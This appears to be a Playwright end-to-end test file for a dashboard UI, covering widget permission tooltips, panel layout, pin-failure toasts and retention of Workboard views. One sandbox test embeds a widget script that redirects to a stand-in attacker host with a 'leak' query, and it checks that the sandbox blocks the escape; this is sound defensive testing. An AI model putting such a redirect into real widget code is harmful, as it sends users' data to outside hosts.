import { once } from "node:events";
import { WORKBOARD_STATUSES, type WorkboardCard } from "@openclaw/workboard-contract";
import type { Locator, Page } from "playwright";
import { expect, it } from "vitest";
import { GATEWAY_SERVER_CAPS } from "../../../packages/gateway-protocol/src/index.js";
import { SANDBOX_HOST_PATH } from "../../../src/agents/sandbox-host.js";
import { buildWidgetDocument } from "../../../src/canvas/wrap.js";
import { createSandboxHostHttpServer } from "../../../src/gateway/mcp-app-sandbox-http.js";
import { selectChatLayoutAction } from "../test-helpers/chat-layout-menu.ts";
import { installControlUiE2eRendererStallProbe } from "../test-helpers/control-ui-e2e-renderer-stall.ts";
import {
  controlUiBundledSettingsStorageKey,
  controlUiSessionUrl,
  installMockGateway,
  type ControlUiMockGatewayScenario,
  type MockGatewayControls,
} from "../test-helpers/control-ui-e2e.ts";
import { workboardUi } from "../test-helpers/control-ui-workboard-fixture.ts";
import { useCanvasSandboxFixture } from "./canvas-sandbox.test-support.ts";
import {
  dockChatSidePanel,
  focusChatSidePanel,
  restoreChatAsMain,
} from "./chat-side-panel.test-support.ts";
import { createControlUiE2eSuite } from "./control-ui-e2e-suite.test-support.ts";
import {
  boardSnapshot,
  pluginWidgetBoardSnapshot,
  sessionKey,
} from "./session-dashboard.test-support.ts";

const suite = createControlUiE2eSuite({
  name: "Control UI session dashboard stitch",
  startServerBeforeBrowser: true,
  trackBrowserContexts: true,
});

async function showDashboard(page: Page): Promise<void> {
  // Every scenario starts in a fresh browser context; no saved views need merging.
  await page.addInitScript(
    ({ key, storageKey }) => {
      localStorage.setItem(
        storageKey,
        JSON.stringify({ boardSessionViews: { [key]: { activeTabId: "main" } } }),
      );
    },
    { key: sessionKey, storageKey: controlUiBundledSettingsStorageKey(suite.server.baseUrl) },
  );
}

async function createProofContext() {
  const context = await suite.newBrowserContext({ viewport: { height: 900, width: 1280 } });
  context.setDefaultTimeout(30_000);
  const page = await context.newPage();
  await installControlUiE2eRendererStallProbe(page);
  return { page, close: () => suite.closeBrowserContext(context) };
}

async function setupDashboard(page: Page, scenario: ControlUiMockGatewayScenario) {
  const gateway = await installMockGateway(page, {
    ...scenario,
    sessionKey,
    featureMethods: [
      "board.get",
      "chat.metadata",
      "chat.startup",
      ...(scenario.featureMethods ?? []),
    ],
    methodResponses: { "board.get": boardSnapshot, ...scenario.methodResponses },
  });
  await showDashboard(page);
  return gateway;
}
const widgetKinds = [
  { pluginId: "workboard", kind: "workboard:card", label: "Workboard card" },
  { pluginId: "workboard", kind: "workboard:mini", label: "Workboard summary" },
];
const assistantHistory = (content: unknown[]) => [{ role: "assistant", content, timestamp: 1 }];
const canvasHistory = (preview: Record<string, unknown>) =>
  assistantHistory([
    {
      type: "canvas",
      preview: { kind: "canvas", surface: "assistant_message", render: "url", ...preview },
    },
  ]);
const canvasDocumentHistory = (title: string, viewId: string) =>
  canvasHistory({
    title,
    viewId,
    url: `/__openclaw__/canvas/documents/${viewId}/index.html`,
    preferredHeight: 240,
    sandbox: "scripts",
  });
const makeCard = (overrides: Partial<WorkboardCard>): WorkboardCard => ({
  id: "card-widget-ready",
  title: "Rebase plugin widget kinds",
  status: "ready",
  priority: "high",
  labels: ["dashboard"],
  position: 1_000,
  createdAt: 1,
  updatedAt: 2,
  agentId: "main",
  metadata: { automation: { boardId: "platform" } },
  ...overrides,
});
const expectStyle = (
  locator: Locator,
  property: "opacity" | "padding" | "borderTopWidth",
  value: string,
) =>
  expect
    .poll(() => locator.evaluate((element, key) => getComputedStyle(element)[key], property))
    .toBe(value);
const expectElement = (
  locator: Locator,
  predicate: (element: HTMLElement | SVGElement) => boolean,
) => expect.poll(() => locator.evaluate(predicate)).toBe(true);
const openDashboard = (page: Page) =>
  page.goto(controlUiSessionUrl(suite.server.baseUrl, sessionKey, "dashboard"));

async function updateCards(
  gateway: MockGatewayControls,
  cards: WorkboardCard[],
  epoch: string,
  revision = 2,
) {
  await gateway.setMethodResponse("workboard.cards.list", workboardCardsListResponse(cards));
  await gateway.emitGatewayEvent("plugin.workboard.changed", { epoch, revision });
}

function workboardCardsListResponse(cards: WorkboardCard[]) {
  return {
    cards,
    boards: [
      { id: "platform", total: cards.length, active: cards.length, archived: 0, byStatus: {} },
    ],
    statuses: WORKBOARD_STATUSES,
  };
}

suite.define(() => {
  const canvasView = useCanvasSandboxFixture();
  it("reveals granted widget permissions with the keyboard", async () => {
    const { page, capture, close } = await createProofContext("widget-permissions-keyboard");
    await setupDashboard(page, {
      methodResponses: {
        "board.get": {
          ...boardSnapshot,
          widgets: [
            {
              ...boardSnapshot.widgets[0]!,
              grantState: "granted",
              declared: { netOrigins: ["https://example.com"], tools: ["sessions.list"] },
            },
          ],
        },
      },
    });
    try {
      await openDashboard(page);
      const widget = page.locator('[data-test-id="board-widget"]');
      const badge = widget.locator('[data-test-id="board-capabilities-granted"]');
      const tooltip = badge.locator("..").getByRole("tooltip");
      await widget.focus();
      await badge.waitFor({ state: "visible" });
      await page.keyboard.press("Tab");
      await capture("01-keyboard-focus.png");
      expect(await badge.evaluate((element) => element.matches(":focus"))).toBe(true);
      await tooltip.waitFor({ state: "visible" });
      expect(await tooltip.textContent()).toContain("https://example.com");
      expect(await tooltip.textContent()).toContain("sessions.list");
      await capture("02-permissions-visible.png");
      await page.keyboard.press("Escape");
      await tooltip.waitFor({ state: "hidden" });
      expect(await badge.evaluate((element) => element.matches(":focus"))).toBe(true);
      await page.keyboard.press("Enter");
      await tooltip.waitFor({ state: "visible" });
      await page.keyboard.press("Escape");
      await tooltip.waitFor({ state: "hidden" });
      await page.keyboard.press("Tab");
      expect(
        await widget
          .locator(".board-widget__menu-trigger")
          .evaluate((element) => element.matches(":focus")),
      ).toBe(true);
    } finally {
      await close();
    }
  });

  it("keeps widget documents in standards mode and cancels self-navigation", async () => {
    const sandboxHost = createSandboxHostHttpServer();
    sandboxHost.listen(0, "127.0.0.1");
    await once(sandboxHost, "listening");
    const sandboxAddress = sandboxHost.address();
    if (!sandboxAddress || typeof sandboxAddress === "string") {
      throw new Error("sandbox host did not bind a TCP address");
    }
    const context = await suite.browser.newContext();
    try {
      const page = await context.newPage();
      const escapeRequests: string[] = [];
      page.on("request", (request) => {
        if (request.url().startsWith("https://attacker.invalid/")) {
          escapeRequests.push(request.url());
        }
      });
      await page.goto(suite.server.baseUrl);
      await page.evaluate((sandboxUrl) => {
        Reflect.set(globalThis, "widgetProbes", []);
        addEventListener("message", (event) => {
          (Reflect.get(globalThis, "widgetProbes") as unknown[]).push(event.data);
        });
        const frame = document.createElement("iframe");
        frame.src = sandboxUrl;
        document.body.replaceChildren(frame);
      }, `http://127.0.0.1:${sandboxAddress.port}${SANDBOX_HOST_PATH}`);
      const probes = () =>
        page.evaluate(
          () =>
            Reflect.get(globalThis, "widgetProbes") as Array<{
              method?: string;
              compatMode?: string;
            }>,
        );
      await expect
        .poll(async () =>
          (await probes()).some(
            (probe) => probe?.method === "ui/notifications/sandbox-proxy-ready",
          ),
        )
        .toBe(true);

      const widgetHtml = `<!doctype html><html><body><script>
        parent.postMessage({
          compatMode: document.compatMode,
        }, "*");
        setTimeout(() => {
          location.href = "https://attacker.invalid/leak?value=sensitive";
        }, 0);
      </script></body></html>`;
      await page.locator("iframe").evaluate((frame, html) => {
        (frame as HTMLIFrameElement).contentWindow?.postMessage(
          {
            method: "ui/notifications/sandbox-resource-ready",
            params: { html },
          },
          "*",
        );
      }, widgetHtml);
      await expect
        .poll(async () => (await probes()).filter((probe) => probe?.compatMode))
        .toEqual([{ compatMode: "CSS1Compat" }]);
      const sandboxFrame = await page
        .locator("iframe")
        .elementHandle()
        .then((handle) => handle?.contentFrame());
      const widgetFrame = sandboxFrame?.childFrames()[0];
      expect(widgetFrame).toBeDefined();
      await page.waitForTimeout(250);
      expect(widgetFrame!.url()).not.toContain("attacker.invalid");
      expect(escapeRequests).toEqual([]);
    } finally {
      await context.close();
      await new Promise<void>((resolve, reject) => {
        sandboxHost.close((error) => (error ? reject(error) : resolve()));
      });
    }
  });

  it("keeps widget actions reachable across dashboard panel widths", async () => {
    const { page, close } = await createProofContext();
    const gateway = await setupDashboard(page, {
      featureCapabilities: [GATEWAY_SERVER_CAPS.BOARD_WIDGET_PUT_CANVAS_DOC],
      featureMethods: ["board.update", "board.widget.grant", "board.widget.put"],
      historyMessages: canvasDocumentHistory("Release status", "cv_release"),
      methodResponses: {
        "canvas.document.view": canvasView(
          buildWidgetDocument("Release status", "<p>Release status</p>"),
        ),
      },
    });
    await openDashboard(page);
    await expect
      .poll(async () => (await gateway.getRequests("board.get")).length, { timeout: 30_000 })
      .toBeGreaterThan(0);
    await page.locator('[data-panel-slot="dashboard"]').waitFor();
    await page.locator(".board-session-surface").waitFor();
    await page.locator(".chat-thread").waitFor();

    await dockChatSidePanel(page, "bottom");
    await expect.poll(() => page.locator(".sidebar-region--bottom").count()).toBe(1);
    await expect.poll(() => page.locator(".board-session-surface").isVisible()).toBe(true);

    await page.setViewportSize({ width: 1440, height: 900 });
    const preview = page.locator('.chat-tool-card__preview[data-kind="canvas"]');
    const widgetActions = preview.locator("[data-widget-actions]");
    await expect.poll(() => preview.locator(".chat-tool-card__preview-header").count()).toBe(0);
    await expectStyle(preview.locator(".chat-tool-card__preview-panel"), "padding", "0px");
    await page.mouse.move(0, 0);
    await expectStyle(widgetActions, "opacity", "0");
    const restingBox = (await preview.boundingBox())!;
    const pin = preview.getByRole("button", { name: "Pin to dashboard" });
    const more = preview.getByRole("button", { name: "Widget actions", exact: true });
    await pin.focus();
    await pin.hover();
    // Hover keeps the toolbar visible after keyboard focus leaves it.
    await page.locator(".agent-chat__composer-combobox textarea").focus();
    await expectStyle(widgetActions, "opacity", "1");
    const geometry = await preview.evaluate((element) => {
      const box = element.getBoundingClientRect();
      const pinBox = element.querySelector("[data-pin-widget]")!.getBoundingClientRect();
      const moreBox = element
        .querySelector(".chat-tool-card__widget-actions-trigger")!
        .getBoundingClientRect();
      const panelBox = element
        .querySelector(".chat-tool-card__preview-panel")!
        .getBoundingClientRect();
      return {
        gap: pinBox.left - box.right,
        actionLeftOffset: moreBox.left - pinBox.left,
        actionVerticalGap: moreBox.top - pinBox.bottom,
        top: pinBox.top - box.top,
        box: { x: box.x, y: box.y, width: box.width, height: box.height },
        panelWidth: panelBox.width,
      };
    });
    expect(geometry.gap).toBeGreaterThan(0);
    expect(geometry.actionVerticalGap).toBeGreaterThan(0);
    expect(geometry).toMatchObject({
      top: 0,
      actionLeftOffset: 0,
      box: restingBox,
      panelWidth: restingBox.width,
    });
    const pinBox = (await pin.boundingBox())!;
    await page.mouse.move(pinBox.x - geometry.gap / 2, pinBox.y + pinBox.height / 2);
    await page.mouse.move(pinBox.x + pinBox.width / 2, pinBox.y + pinBox.height / 2);
    await expectStyle(widgetActions, "opacity", "1");
    await page.mouse.move(0, 0);
    await pin.focus();
    await page.keyboard.press("Tab");
    await expectElement(more, (element) => element.matches(":focus-visible"));
    await expectStyle(widgetActions, "opacity", "1");
    await page.keyboard.press("Enter");
    await expect.poll(() => preview.locator(".oc-menu:popover-open").count()).toBe(1);
    await page.keyboard.press("Escape");
    const conversation = page.locator(".sidebar-region__primary", { has: preview });
    for (const width of [796, 794, 390, 1440]) {
      await page.setViewportSize({ width, height: 900 });
      await expect.poll(() => conversation.count()).toBe(1);
      if (width !== 1440) {
        // Mobile panels share the screen with the retained conversation.
        await expect.poll(() => conversation.isVisible()).toBe(true);
        await page.locator('.chat-mobile-host[data-mode="dock"]').waitFor();
        await expect.poll(() => page.locator(".board-session-surface").isVisible()).toBe(true);
        continue;
      }
      await expect.poll(() => conversation.isVisible()).toBe(true);
      await expectElement(preview, (element) => {
        const box = element.getBoundingClientRect();
        const actions = element.querySelector("[data-widget-actions]")!.getBoundingClientRect();
        const pinBounds = element.querySelector("[data-pin-widget]")!.getBoundingClientRect();
        const thread = element.closest(".chat-thread")!;
        const threadBox = thread.getBoundingClientRect();
        if (
          [box, actions, pinBounds, threadBox].some(
            ({ width: rectWidth, height }) => rectWidth <= 0 || height <= 0,
          )
        ) {
          return false;
        }
        const edge = threadBox.left + thread.clientLeft + thread.clientWidth;
        return edge - box.right >= 40
          ? actions.left >= box.right && actions.right <= edge && actions.top === box.top
          : actions.right <= box.right && actions.bottom === box.top;
      });
    }
    await pin.focus();
    await pin.hover();
    await expectStyle(preview.locator(".chat-tool-card__preview-frame"), "borderTopWidth", "0px");
    await close();
  });

  it("shows a bounded visible outcome when a Canvas dashboard pin fails", async () => {
    const { page, close } = await createProofContext();
    const gateway = await setupDashboard(page, {
      featureCapabilities: [GATEWAY_SERVER_CAPS.BOARD_WIDGET_PUT_CANVAS_DOC],
      featureMethods: ["board.update", "board.widget.grant", "board.widget.put"],
      historyMessages: canvasDocumentHistory("Stale release status", "cv_stale"),
      methodResponses: {
        // Pin failure does not depend on widget scripting; keep the visible preview deterministic.
        "canvas.document.view": canvasView(
          "<!doctype html><html><body><p>Stale release status</p></body></html>",
        ),
        "board.widget.put": {
          __mockError: {
            code: "NOT_FOUND",
            message: `internal path detail ${"x".repeat(8_000)}`,
          },
        },
      },
    });
    await openDashboard(page);
    await page.locator(".board-session-surface").waitFor();
    const preview = page.locator('.chat-tool-card__preview[data-kind="canvas"]');
    const pin = preview.getByRole("button", { name: "Pin to dashboard" });
    await expectStyle(preview.locator("[data-widget-actions]"), "opacity", "0.6");
    await expectElement(pin, (element) => {
      const box = element.getBoundingClientRect();
      const thread = element.closest(".chat-thread")!.getBoundingClientRect();
      return box.top >= thread.top;
    });
    const detailsToggle = page.getByRole("button", { name: "Details", exact: true });
    const detailsBox = (await detailsToggle.boundingBox())!;
    const pinBox = (await pin.boundingBox())!;
    expect(
      pinBox.x + pinBox.width <= detailsBox.x ||
        pinBox.x >= detailsBox.x + detailsBox.width ||
        pinBox.y + pinBox.height <= detailsBox.y ||
        pinBox.y >= detailsBox.y + detailsBox.height,
    ).toBe(true);
    await pin.focus();
    expect(
      await pin.evaluate((element) => {
        const box = element.getBoundingClientRect();
        return element.contains(
          document.elementFromPoint(box.x + box.width / 2, box.y + box.height / 2),
        );
      }),
    ).toBe(true);
    await pin.click();

    await expect.poll(async () => (await gateway.getRequests("board.widget.put")).length).toBe(1);
    const toast = page.locator("openclaw-toast-host .app-toast");
    await toast.waitFor();
    expect(await toast.textContent()).toContain("Could not pin to dashboard. Try again.");
    expect(await pin.isEnabled()).toBe(true);
    await page.mouse.move(0, 0);
    await pin.focus();
    await pin.hover();
    const hint = page.locator(".tooltip-surface[popover]:popover-open");
    await hint.locator(".tooltip-content").waitFor({ state: "visible" });
    expect(await hint.textContent()).toContain("Could not pin to dashboard. Try again.");
    expect(await page.getByText("internal path detail", { exact: false }).count()).toBe(0);
    await close();
  });

  it("retains native Workboard views across presentation changes", async () => {
    const { page, close } = await createProofContext();
    const card = makeCard({ sessionKey });
    const refreshed = { ...card, title: "Refreshed while hidden", updatedAt: 3 };
    const gateway = await setupDashboard(page, {
      ...workboardUi,
      controlUiWidgetKinds: widgetKinds,
      featureMethods: ["sessions.patch", "workboard.cards.list"],
      methodResponses: {
        "board.get": pluginWidgetBoardSnapshot,
        "workboard.cards.list": workboardCardsListResponse([card]),
      },
    });
    try {
      await openDashboard(page);
      const widget = page.locator('[data-test-id="workboard-card-widget"]');
      await expect.poll(() => widget.textContent()).toContain(card.title);
      const accessory = page.locator(".workboard-session-chip");
      await expect.poll(() => accessory.textContent()).toContain(card.title);
      const nativeView = page.locator("openclaw-plugin-view").filter({ has: widget });
      const original = await nativeView.elementHandle();
      expect(original).not.toBeNull();
      const expectPresented = (presented: boolean) =>
        expect
          .poll(() =>
            nativeView.evaluate(
              (element, state) =>
                element === state.original &&
                element.isConnected &&
                Reflect.get(element, "presented") === state.presented,
              { original, presented },
            ),
          )
          .toBe(true);
      await focusChatSidePanel(page);
      await expectPresented(true);
      await selectChatLayoutAction(page, "Restore split");
      await restoreChatAsMain(page);
      await selectChatLayoutAction(page, "Minimize side panel");
      await expect.poll(() => page.locator(".board-session-surface").isVisible()).toBe(false);
      await expectPresented(false);
      await updateCards(gateway, [refreshed], "plugin-widget-hidden");
      await expect.poll(() => accessory.textContent()).toContain(refreshed.title);
      await gateway.emitGatewayEvent("board.command", {
        sessionKey,
        command: { kind: "focus_tab", tabId: "main" },
      });
      await expectPresented(true);
      await expect.poll(() => widget.textContent()).toContain(refreshed.title);
      await updateCards(gateway, [], "plugin-widget-hidden", 3);
      await expect.poll(() => accessory.count()).toBe(0);
      await updateCards(gateway, [refreshed], "plugin-widget-hidden", 4);
      await expect.poll(() => accessory.textContent()).toContain(refreshed.title);
    } finally {
      await close();
    }
  });
});
